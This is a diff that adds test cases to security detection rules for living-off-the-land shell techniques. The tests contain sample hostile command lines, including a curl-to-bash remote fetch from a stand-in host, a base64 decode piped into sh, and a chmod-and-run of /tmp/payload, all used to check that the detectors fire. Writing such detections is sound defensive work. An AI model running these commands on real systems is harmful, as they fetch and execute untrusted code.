@@ -32,6 +32,19 @@ rules:
     condition:
       operator: ">="
       value: 1
+    tests:
+      - name: "curl piped into bash fires"
+        expected: match
+        events:
+          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "remote_fetch_exec", exe_name: "curl", parent_exe_name: "bash", cmdline: "curl -fsSL https://x.test/i.sh | bash"}}
+      - name: "download without shell pipe does not fire"
+        expected: no_match
+        events:
+          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "remote_fetch_exec", exe_name: "curl", parent_exe_name: "bash", cmdline: "curl -fsSL https://x.test/i.sh -o /tmp/i.sh"}}
+      - name: "non-remote-fetch pattern does not fire"
+        expected: no_match
+        events:
+          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "normal_exec", exe_name: "bash", parent_exe_name: "sshd", cmdline: "bash -c id"}}
 
   - id: lotl_base64_decode_execute_chain_v1
     name: "Base64 decode-and-execute chain"
@@ -63,6 +76,19 @@ rules:
     condition:
       operator: ">="
       value: 1
+    tests:
+      - name: "base64 decode into shell fires"
+        expected: match
+        events:
+          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "interpreter", exe_name: "bash", cmdline: "echo cGF5 | base64 -d | sh"}}
+      - name: "plain command does not fire"
+        expected: no_match
+        events:
+          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "interpreter", exe_name: "bash", cmdline: "echo hello world"}}
+      - name: "non-interpreter pattern does not fire"
+        expected: no_match
+        events:
+          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "normal_exec", exe_name: "base64", cmdline: "base64 -d data.b64"}}
 
   - id: lotl_eval_interpreter_abuse_v1
     name: "Interpreter eval abuse"
@@ -91,6 +117,21 @@ rules:
     condition:
       operator: ">="
       value: 2
+    tests:
+      - name: "repeated eval abuse fires"
+        expected: match
+        events:
+          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "interpreter", exe_name: "bash", cmdline: "sh -c ' eval $cmd'"}}
+          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "interpreter", exe_name: "bash", cmdline: "sh -c ' eval $other'"}}
+      - name: "single eval stays below threshold"
+        expected: no_match
+        events:
+          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "interpreter", exe_name: "bash", cmdline: "sh -c ' eval $cmd'"}}
+      - name: "ordinary interpreter run does not fire"
+        expected: no_match
+        events:
+          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "interpreter", exe_name: "python3", cmdline: "python3 app.py"}}
+          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "interpreter", exe_name: "python3", cmdline: "python3 worker.py"}}
 
   - id: lotl_tmp_chmod_execute_chain_v1
     name: "chmod +x staging followed by execution path"
@@ -119,6 +160,19 @@ rules:
     condition:
       operator: ">="
       value: 1
+    tests:
+      - name: "chmod +x in tmp staging fires"
+        expected: match
+        events:
+          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "shell_spawn", exe_name: "bash", cmdline: "chmod +x /tmp/payload && /tmp/payload"}}
+      - name: "chmod outside tmp does not fire"
+        expected: no_match
+        events:
+          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "shell_spawn", exe_name: "bash", cmdline: "chmod +x /usr/local/bin/app"}}
+      - name: "non-shell pattern does not fire"
+        expected: no_match
+        events:
+          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "normal_exec", exe_name: "chmod", cmdline: "chmod +x /tmp/payload"}}
 
   - id: lotl_network_service_shell_spawn_chain_v1
     name: "Shell spawned from network-facing service chain"
@@ -146,3 +200,16 @@ rules:
     condition:
       operator: ">="
       value: 1
+    tests:
+      - name: "service-spawned shell fires"
+        expected: match
+        events:
+          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "service_shell_child", exe_name: "sh", parent_exe_name: "nginx"}}
+      - name: "interpreter pattern does not fire"
+        expected: no_match
+        events:
+          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "interpreter", exe_name: "python3", parent_exe_name: "cron"}}
+      - name: "shell spawn pattern does not fire"
+        expected: no_match
+        events:
+          - {event_type: "proc_exec", agent_id: "agent-1", timestamp: "2026-06-01T00:00:00Z", extra: {exec_pattern: "shell_spawn", exe_name: "bash", parent_exe_name: "sshd"}}
